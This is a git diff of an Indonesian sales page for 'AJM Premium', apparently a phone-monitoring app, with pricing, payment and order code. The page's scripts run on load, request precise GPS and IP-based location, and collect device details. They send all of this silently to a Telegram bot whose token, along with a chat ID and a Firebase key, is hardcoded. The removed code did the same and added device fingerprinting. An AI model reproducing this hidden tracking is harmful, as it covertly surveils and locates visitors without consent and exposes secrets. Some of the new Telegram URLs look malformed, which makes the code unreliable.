@@ -241,10 +241,11 @@
         <button class="btn-more" id="btnAJM" onclick="toggleMore()">LIHAT SEMUA FITUR LENGKAP</button>
     </div>
     <br>
-    <a href="#" class="testi-btn" style="background: linear-gradient(135deg,#22c55e,#16a34a);" onclick="goTrial()">🚀 COBA GRATIS (TRIAL)
+    <a href="https://download-aplikasi-ajm.vercel.app" 
+    class="testi-btn" 
+    style="background: linear-gradient(135deg,#22c55e,#16a34a);">
+   🚀 COBA GRATIS (TRIAL)
     </a>
-    <div id="trialTimerBox" style="display:none; margin-bottom:15px; text-align:center; font-size:13px; color:#22c55e; font-weight:700;">
-      ⏳ Sisa Trial: <span id="trialTime">00:00</span>
     </div>
     <div class="section-tag">Billing & Activation</div>
     <div class="form-box">
@@ -254,14 +255,11 @@
             <option value="Bulanan" data-price="300000">
               AJM Standard (30 Hari) - Rp 300.000
             </option>
-            <option value="Tahunan" data-price="450000">
-              ⚡ AJM Advanced (1 Tahun) - Rp 450.000 <span class="old-price">600.000</span>
-              🔥 HEMAT 150K
+            <option value="Tahunan" data-price="400000">
+              ⚡ FLASH SALE! AJM Advanced - Rp 400.000 🔥
             </option>
             <option value="Permanen" data-price="650000">
-              🚀 AJM Lifetime (Selamanya) - Rp 650.000 
-              <span class="old-price">900.000</span>
-              <span class="badge badge-best">BEST VALUE</span>
+              🚀 SUPER DEAL! Lifetime - Rp 650.000 ⭐
             </option>
         </select>
 
@@ -273,6 +271,17 @@
         <div id="qrisBox" class="qris-area">
             <img src="https://image2url.com/r2/default/images/1774994780969-3206b975-d7c3-431c-b9cb-8e9ee5c13fde.png">
             <span id="displayAmount" style="font-size: 26px; font-weight: 800; color: #059669; display: block; margin-top: 15px;"></span>
+            <input type="file" id="uploadProof" accept="image/*" style="margin-top:15px;">
+            <button onclick="uploadBukti()" style="
+            margin-top:10px;
+            padding:12px;
+            border:none;
+            border-radius:12px;
+            background:#22c55e;
+            color:white;
+            font-weight:bold;
+            width:100%;">UPLOAD BUKTI TRANSFER
+            </button>
         </div>
 
         <div id="adminChats" class="admin-chat-grid">
@@ -280,14 +289,44 @@
             <a href="#" class="chat-btn" style="background: var(--telegram);" onclick="sendOrder('TG')">TELEGRAM</a>
         </div>
     </div>
+    <div style="
+margin-top:15px;
+padding:18px;
+border-radius:20px;
+background: linear-gradient(135deg, rgba(34,197,94,0.15), rgba(0,0,0,0.2));
+border:1px solid rgba(34,197,94,0.4);
+text-align:center;
+">
 
+<div style="font-size:13px; font-weight:800; color:#22c55e;">
+🔒 GARANSI 100% UANG KEMBALI
+</div>
+
+<div style="font-size:11px; color:#bbf7d0; margin-top:6px;">
+Jika sistem tidak berfungsi dengan baik, dana Anda akan dikembalikan tanpa syarat
+</div>
+
+</div>
     <footer class="footer">
-    <p>© 2026 // ENCRYPTED NETWORK // ACCESS LOGGED</p>
-    <p>
-        <a href="#">[PRIVACY]</a> 
-        <span>::</span> 
-        <a href="#">[TERMS]</a>
-    </p>
+    <div style="font-size:14px; font-weight:700;">
+        AJM Premium
+    </div>
+
+    <div style="margin-top:8px; font-size:12px; color:#94a3b8;">
+        Solusi monitoring modern & terpercaya
+    </div>
+
+    <div style="margin-top:12px; font-size:12px;">
+        <a href="#" style="color:#94a3b8; text-decoration:none;">Privacy Policy</a>
+        <span style="margin:0 6px;">•</span>
+        <a href="#" style="color:#94a3b8; text-decoration:none;">Terms</a>
+        <span style="margin:0 6px;">•</span>
+        <a href="#" style="color:#94a3b8; text-decoration:none;">Support</a>
+    </div>
+
+    <div style="margin-top:12px; font-size:11px; color:#64748b;">
+        © 2026 AJM Premium. All rights reserved.
+    </div>
 </footer>
 </div>
 
@@ -298,6 +337,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
 import { getDatabase, ref, increment, update, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
+// ================= FIREBASE =================
 const firebaseConfig = {
     apiKey: "AIzaSyBSRUZheiN6UQshTHyKvZN0PLZ-pYyF3JE",
     authDomain: "pengunjung-dbc40.firebaseapp.com",
@@ -312,111 +352,87 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 const statsRef = ref(db, 'system_stats');
 
-// ================= BROWSER =================
-function getBrowser() {
+// ================= BASIC INFO =================
+const getBrowser = () => {
     const ua = navigator.userAgent;
     if (ua.includes("Chrome")) return "Chrome";
     if (ua.includes("Firefox")) return "Firefox";
     if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-    if (ua.includes("Edge")) return "Edge";
     return "Unknown";
-}
+};
 
-// ================= DOWNLOAD COUNTER =================
-function getDownloadCount() {
-    let count = localStorage.getItem("ajm_download");
-
-    if (!count) count = 1;
-    else count = parseInt(count) + 1;
-
+const getDownloadCount = () => {
+    let count = localStorage.getItem("ajm_download") || 0;
+    count = parseInt(count) + 1;
     localStorage.setItem("ajm_download", count);
     return count;
-}
+};
 
-// ================= GPS =================
-async function getGPS() {
-    let gpsData = "Tidak diizinkan";
+// ================= AUTO GPS =================
+window.gpsData = "Detecting...";
 
-    if (navigator.geolocation) {
-        gpsData = await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    resolve(`Lat: ${lat}, Lon: ${lon}
-🗺 https://www.google.com/maps?q=${lat},${lon}`);
-                },
-                () => resolve("User menolak izin GPS"),
-                { timeout: 5000 }
-            );
-        });
-    }
+function requestLocation() {
+    if (!navigator.geolocation) return;
 
-    return gpsData;
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            const { latitude, longitude } = pos.coords;
+            window.gpsData = `Lat: ${latitude}, Lon: ${longitude}`;
+        },
+        () => window.gpsData = "Location blocked",
+        { enableHighAccuracy: true, timeout: 8000 }
+    );
 }
 
 // ================= ANTI SPAM =================
 function antiSpamVisit() {
     const now = Date.now();
-    const lastVisit = localStorage.getItem("ajm_last_visit");
+    const last = localStorage.getItem("ajm_last_visit");
 
-    if (lastVisit && (now - lastVisit < 10000)) {
-        console.warn("Spam refresh terdeteksi");
-        return false;
-    }
+    if (last && now - last < 10000) return false;
 
     localStorage.setItem("ajm_last_visit", now);
     return true;
 }
 
 // ================= MAIN LOG =================
-async function logToAdmin() {
+async function logToAdmin(type = "VISIT") {
     try {
-        // IP DATA
         const ipRes = await fetch('https://ipapi.co/json/');
         const d = await ipRes.json();
 
-        // GPS
-        const gpsData = await getGPS();
-
-        // WAKTU
         const now = new Date();
-        const tgl = now.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
         const jam = now.toLocaleTimeString('id-ID');
 
-        // MESSAGE
+        const name = document.getElementById("userName")?.value || "UNKNOWN";
+        const plan = document.getElementById("userPlan")?.value || "NO PACKAGE";
+
+        // ❗ HANYA KIRIM JIKA ORDER / PAYMENT
+        if (type === "ORDER" && (!name || !plan || !window.selectedMethod)) {
+            return;
+        }
+
         const msg = `
-🔥 *AJM SYSTEM: USER ACTIVITY* 🔥
-━━━━━━━━━━━━━━━━━━━━
-👤 *DATA USER*
-🧑 Nama: \`${document.getElementById("userName")?.value || "Tidak diisi"}\`
-📦 Paket: \`${document.getElementById("userPlan")?.value || "Trial"}\`
-💳 Payment: \`${window.selectedMethod || "Belum dipilih"}\`
+🔥 *AJM ORDER SYSTEM*
+━━━━━━━━━━━━━━━━━━
+👤 ${name}
+📦 ${plan}
+💳 ${window.selectedMethod || "-"}
 
-📱 *INFORMASI PERANGKAT*
-🤖 Device: \`${navigator.userAgent}\`
-🌐 Browser: \`${getBrowser()}\`
-🖥 Resolusi: \`${window.screen.width}x${window.screen.height}\`
-🌍 Bahasa: \`${navigator.language}\`
+💰 ${document.getElementById("displayAmount")?.innerText || "-"}
 
-📍 *LOKASI (APPROX)*
-📌 ${d.city || "-"}, ${d.region || "-"}, ${d.country_name || "-"}
+🖥 ${getBrowser()} • ${screen.width}x${screen.height}
+🌐 ${navigator.language}
 
-📍 *GPS REAL*
-${gpsData}
+📍 ${d.city || "-"}, ${d.country_name || "-"}
+🛰 ${window.gpsData}
 
-📊 *STATISTIK*
-⬇️ Download Aplikasi: \`${getDownloadCount()}\` User
-
-🕒 *WAKTU AKSES*
-📅 ${tgl}
-⏰ ${jam} WIB
-━━━━━━━━━━━━━━━━━━━━
-🛰 *STATUS: USER TRACKED*
+⏰ ${jam}
+━━━━━━━━━━━━━━━━━━
+⚡ ${type}
 `;
 
-        // KIRIM TELEGRAM
-        await fetch(`https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage`, {
+        await fetch(`https://api.telegram.org/7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -426,22 +442,15 @@ ${gpsData}
             })
         });
 
-        // TOAST
-        const t = document.getElementById('visitorToast');
-        if (t) {
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 4000);
-        }
-
-    } catch (err) {
-        console.error("Error:", err);
+    } catch (e) {
+        console.error(e);
     }
 }
 
 // ================= INIT =================
 update(statsRef, { total_visits: increment(1) });
 
-onValue(statsRef, (snap) => {
+onValue(statsRef, snap => {
     const data = snap.val();
     if (data) {
         document.getElementById('totalVisitorsDisplay').innerText =
@@ -449,339 +458,177 @@ onValue(statsRef, (snap) => {
     }
 });
 
-// JALANKAN SEKALI SAJA (ANTI SPAM)
-if (antiSpamVisit()) {
-    logToAdmin();
-}
-</script>
-
-<script>
-(() => {
-    "use strict";
-
-    // ================= VIDEO AUTO PLAY =================
-    window.addEventListener('load', () => {
-        const v = document.getElementById('headerVideo');
-        if (!v) return;
-
-        v.play().catch(() => {
-            document.body.addEventListener('touchstart', () => v.play(), { once: true });
-        });
-    });
-
-    // ================= TYPING EFFECT =================
-    const texts = [
-  "ACCESS GRANTED",
-  "BREACHING SECURITY LAYER",
-  "INJECTING PAYLOAD",
-  "ROOT ACCESS ACQUIRED",
-  "ENCRYPTION LOCKED",
-  "SYSTEM FULL CONTROL"
-];
-    let count = 0, index = 0;
-
-    function typeEffect() {
-        const el = document.getElementById("typeEffect");
-        if (!el) return;
-
-        if (count >= texts.length) count = 0;
-
-        const current = texts[count];
-        const text = current.slice(0, ++index);
-
-        el.textContent = text;
-
-        if (text.length === current.length) {
-            count++;
-            index = 0;
-            setTimeout(typeEffect, 2000);
-        } else {
-            setTimeout(typeEffect, 80);
-        }
-    }
-    typeEffect();
-
-    // ================= TOGGLE FITUR =================
-    window.toggleMore = function () {
-        const more = document.getElementById('moreAJM');
-        const btn = document.getElementById('btnAJM');
-        if (!more || !btn) return;
-
-        const isHidden = getComputedStyle(more).display === 'none';
-        more.style.display = isHidden ? 'block' : 'none';
-        btn.innerText = isHidden ? 'TUTUP' : 'LIHAT SEMUA';
-    };
-
-    // ================= MODAL =================
-    window.pop = function (title, text) {
-        const modal = document.getElementById('modal');
-        const mTitle = document.getElementById('mTitle');
-        const mText = document.getElementById('mText');
-
-        if (!modal || !mTitle || !mText) return;
-
-        mTitle.innerText = title;
-        mText.innerText = text;
-        modal.style.display = 'flex';
-    };
-
-    window.closePop = function () {
-        const modal = document.getElementById('modal');
-        if (modal) modal.style.display = 'none';
-    };
-
-    // ================= STATE =================
-    let currentPrice = 0;
-    window.selectedMethod = '';
-
-    // ================= PLAN =================
-    window.handlePlanChange = function () {
-        const plan = document.getElementById('userPlan');
-        const payment = document.getElementById('paymentOptions');
-        const qris = document.getElementById('qrisBox');
-        const chats = document.getElementById('adminChats');
-        const dpBtn = document.getElementById('optDP');
-
-        if (!plan || !payment) return;
-
-        const selected = plan.options[plan.selectedIndex];
-        currentPrice = parseInt(selected.getAttribute('data-price')) || 0;
-
-        // Reset UI
-        payment.style.display = 'grid';
-        if (qris) qris.style.display = 'none';
-        if (chats) chats.style.display = 'none';
-
-        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
-
-        // Logic DP
-        if (plan.value === 'Tahunan' || plan.value === 'Permanen') {
-            if (dpBtn) dpBtn.style.display = 'block';
-            payment.style.gridTemplateColumns = '1fr 1fr';
-        } else {
-            if (dpBtn) dpBtn.style.display = 'none';
-            payment.style.gridTemplateColumns = '1fr';
-        }
-    };
-
-    // ================= SELECT PAYMENT =================
-    window.selectPay = function (method) {
-        const qris = document.getElementById('qrisBox');
-        const chats = document.getElementById('adminChats');
-        const display = document.getElementById('displayAmount');
-
-        window.selectedMethod = method;
-
-        document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
-        const active = document.getElementById('opt' + method);
-        if (active) active.classList.add('active');
-
-        let amount = (method === 'DP') ? currentPrice * 0.6 : currentPrice;
-
-        if (display) {
-            display.innerText = "Rp " + amount.toLocaleString('id-ID');
-        }
-
-        if (qris) qris.style.display = 'block';
-        if (chats) chats.style.display = 'grid';
-    };
-
-    // ================= ORDER =================
-    window.sendOrder = function (platform) {
-        const name = document.getElementById('userName')?.value.trim();
-        const plan = document.getElementById('userPlan')?.value;
-
-        if (!name || !plan || !window.selectedMethod) {
-            alert("Lengkapi Nama & Pilih Metode!");
-            return;
-        }
-
-        const total = document.getElementById('displayAmount')?.innerText || "-";
-
-        const msg = `🔥 *ORDER AJM* 🔥
-👤 Nama: ${name}
-📦 Paket: ${plan}
-💳 Tipe: ${window.selectedMethod}
-💰 Total: ${total}`;
-
-        const url = (platform === 'WA')
-            ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}`
-            : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
-
-        window.open(url, '_blank');
-    };
-
-})();
-</script>
-<script>
-let trialInterval = null;
-
-// ================= CONFIG =================
-const TRIAL_DURATION = 60000; // 3 hari
-
-// ================= DEVICE FINGERPRINT =================
-function getDeviceId() {
-    let raw = [
-        navigator.userAgent,
-        navigator.language,
-        screen.width + "x" + screen.height,
-        navigator.hardwareConcurrency || "cpu",
-        navigator.deviceMemory || "ram"
-    ].join("|");
-
-    return btoa(raw); // encode sederhana
-}
-
-// ================= HASH PROTECTION =================
-function createHash(data) {
-    return btoa(JSON.stringify(data)).slice(0, 50);
-}
-
-// ================= AMBIL WAKTU SERVER =================
-async function getServerTime() {
-    try {
-        const res = await fetch("https://worldtimeapi.org/api/ip");
-        const data = await res.json();
-        return new Date(data.utc_datetime).getTime();
-    } catch {
-        return Date.now(); // fallback
-    }
-}
-
-// ================= SIMPAN DATA =================
-function saveTrial(data) {
-    data.hash = createHash(data);
-    localStorage.setItem("ajm_trial_data", JSON.stringify(data));
-}
-
-// ================= VALIDASI DATA =================
-function validateTrial(data) {
-    if (!data || !data.hash) return false;
-
-    const checkHash = createHash({
-        start: data.start,
-        expire: data.expire,
-        device: data.device
-    });
-
-    return data.hash === checkHash;
-}
-
-// ================= MAIN TRIAL =================
-async function goTrial() {
-    const now = await getServerTime();
-    const deviceId = getDeviceId();
-
-    let trialData = JSON.parse(localStorage.getItem("ajm_trial_data"));
-
-    // ================= CEK EXISTING =================
-    if (trialData && validateTrial(trialData)) {
-
-        // Cek device
-        if (trialData.device !== deviceId) {
-            alert("❌ Trial hanya berlaku untuk 1 device!");
-            return;
-        }
-
-        // Cek waktu
-        if (now < trialData.expire) {
-            startTrialTimer(trialData.expire);
-            safeRedirect(trialData.url);
-            return;
-        } else {
-            alert("⚠️ Trial sudah habis!");
-            localStorage.removeItem("ajm_trial_data");
-            return;
-        }
-    }
-
-    // ================= BUAT TRIAL BARU =================
-    const expireTime = now + TRIAL_DURATION;
-
-    const data = {
-        start: now,
-        expire: expireTime,
-        device: deviceId,
-        url: "https://download-aplikasi-ajm.vercel.app"
-    };
-
-    saveTrial(data);
-
-    startTrialTimer(expireTime);
-    sendTrialNotif(deviceId);
-
-    safeRedirect(data.url);
-}
-
-// ================= TIMER =================
-function startTrialTimer(expireTime) {
-    const box = document.getElementById("trialTimerBox");
-    const text = document.getElementById("trialTime");
-
-    if (!box || !text) return;
-
-    box.style.display = "block";
-
-    if (trialInterval) clearInterval(trialInterval);
-
-    trialInterval = setInterval(async () => {
-        const now = await getServerTime();
-        const remaining = expireTime - now;
-
-        if (remaining <= 0) {
-            clearInterval(trialInterval);
-            localStorage.removeItem("ajm_trial_data");
-            text.innerText = "00:00:00";
-            alert("⛔ Trial habis!");
-            return;
-        }
-
-        const d = Math.floor(remaining / (1000 * 60 * 60 * 24));
-        const h = Math.floor((remaining / (1000 * 60 * 60)) % 24);
-        const m = Math.floor((remaining / (1000 * 60)) % 60);
-        const s = Math.floor((remaining / 1000) % 60);
-
-        text.innerText =
-            `${d}H ${String(h).padStart(2,'0')}J ` +
-            `${String(m).padStart(2,'0')}M ` +
-            `${String(s).padStart(2,'0')}D`;
-
-    }, 1000);
-}
-
-// ================= REDIRECT =================
-function safeRedirect(url) {
-    setTimeout(() => window.location.href = url, 300);
-}
-
-// ================= TELEGRAM LOG =================
-function sendTrialNotif(deviceId) {
-    try {
-        fetch("https://api.telegram.org/bot8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto/sendMessage", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                chat_id: "8215645360",
-                text: `🚀 TRIAL AKTIF\nDevice: ${deviceId}`
-            })
-        });
-    } catch {}
-}
-
-// ================= AUTO CHECK =================
-window.addEventListener("load", async () => {
-    let trialData = JSON.parse(localStorage.getItem("ajm_trial_data"));
-
-    if (trialData && validateTrial(trialData)) {
-        const now = await getServerTime();
-
-        if (now < trialData.expire) {
-            startTrialTimer(trialData.expire);
-        } else {
-            localStorage.removeItem("ajm_trial_data");
-        }
+window.addEventListener("load", () => {
+    requestLocation();
+
+    if (antiSpamVisit()) {
+        setTimeout(logToAdmin, 2000); // biar gps sempat kebaca
     }
 });
+</script>
+<script>
+(() => {
+"use strict";
+
+// VIDEO AUTOPLAY
+window.addEventListener('load', () => {
+    const v = document.getElementById('headerVideo');
+    v?.play().catch(() => {
+        document.body.addEventListener('touchstart', () => v.play(), { once: true });
+    });
+});
+
+// TYPING EFFECT
+const texts = ["ACCESS GRANTED","BREACHING SECURITY","ROOT ACCESS","SYSTEM LOCKED"];
+let i=0,j=0;
+
+function type() {
+    const el = document.getElementById("typeEffect");
+    if (!el) return;
+
+    if (i >= texts.length) i = 0;
+
+    el.textContent = texts[i].slice(0, ++j);
+
+    if (j === texts[i].length) {
+        i++; j=0;
+        setTimeout(type,1500);
+    } else setTimeout(type,60);
+}
+type();
+
+// TOGGLE
+window.toggleMore = () => {
+    const more = document.getElementById('moreAJM');
+    more.style.display = more.style.display === 'block' ? 'none' : 'block';
+};
+
+// MODAL
+window.pop = (t,tx)=>{
+    document.getElementById('mTitle').innerText=t;
+    document.getElementById('mText').innerText=tx;
+    document.getElementById('modal').style.display='flex';
+};
+window.closePop=()=>document.getElementById('modal').style.display='none';
+
+// PAYMENT
+let currentPrice = 0;
+window.selectedMethod = '';
+
+window.handlePlanChange = function () {
+    const plan = document.getElementById('userPlan');
+    const payment = document.getElementById('paymentOptions');
+    const dpBtn = document.getElementById('optDP');
+
+    const selected = plan.options[plan.selectedIndex];
+    currentPrice = parseInt(selected.dataset.price || 0);
+
+    // tampilkan payment option
+    payment.style.display = 'grid';
+
+    // reset active
+    document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
+
+    // LOGIC UTAMA
+    if (plan.value === 'Tahunan' || plan.value === 'Permanen') {
+        dpBtn.style.display = 'block'; // tampilkan DP
+        payment.style.gridTemplateColumns = '1fr 1fr';
+    } else {
+        dpBtn.style.display = 'none'; // sembunyikan DP
+        payment.style.gridTemplateColumns = '1fr';
+    }
+
+    // reset tampilan bawah
+    document.getElementById('qrisBox').style.display = 'none';
+    document.getElementById('adminChats').style.display = 'none';
+};
+
+window.selectPay = function (method) {
+    window.selectedMethod = method;
+
+    // aktifkan tombol
+    document.querySelectorAll('.opt-card').forEach(c => c.classList.remove('active'));
+    document.getElementById('opt' + method).classList.add('active');
+
+    // LOGIC HARGA
+    let amount = method === 'DP'
+        ? currentPrice * 0.5   // ✅ SETENGAH (DP)
+        : currentPrice;        // FULL
+
+    document.getElementById('displayAmount').innerText =
+        "Rp " + amount.toLocaleString('id-ID');
+
+    document.getElementById('qrisBox').style.display = 'block';
+    document.getElementById('adminChats').style.display = 'grid';
+};
+
+// ORDER
+window.sendOrder = async (p)=>{
+    const name = document.getElementById('userName').value;
+    const plan = document.getElementById('userPlan').value;
+
+    if(!name||!plan||!window.selectedMethod){
+        alert("Lengkapi data!");
+        return;
+    }
+
+    // 🔥 KIRIM KE TELEGRAM ADMIN
+    await logToAdmin("ORDER");
+
+    const total = document.getElementById('displayAmount').innerText;
+
+    const msg = `ORDER AJM
+${name}
+${plan}
+${window.selectedMethod}
+${total}`;
+
+    const url = p==="WA"
+    ? `https://wa.me/6283869335367?text=${encodeURIComponent(msg)}`
+    : `https://t.me/Aldinugroho378?text=${encodeURIComponent(msg)}`;
+
+    window.open(url,'_blank');
+};
+
+window.uploadBukti = async function () {
+    const fileInput = document.getElementById("uploadProof");
+    const file = fileInput.files[0];
+
+    if (!file) {
+        alert("Upload bukti dulu!");
+        return;
+    }
+
+    const name = document.getElementById("userName").value || "UNKNOWN";
+    const plan = document.getElementById("userPlan").value || "-";
+    const total = document.getElementById("displayAmount").innerText || "-";
+
+    const formData = new FormData();
+    formData.append("chat_id", "8215645360");
+    formData.append("photo", file);
+    formData.append("caption", `
+📸 *BUKTI PEMBAYARAN*
+━━━━━━━━━━━━━━━━━━
+👤 ${name}
+📦 ${plan}
+💰 ${total}
+💳 ${window.selectedMethod}
+━━━━━━━━━━━━━━━━━━
+    `);
+
+    try {
+        await fetch("https://api.telegram.org/7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls/sendPhoto", {
+            method: "POST",
+            body: formData
+        });
+
+        alert("Bukti berhasil dikirim!");
+    } catch (e) {
+        alert("Gagal upload!");
+        console.error(e);
+    }
+};
+})();
 </script>
 </body>
 </html>
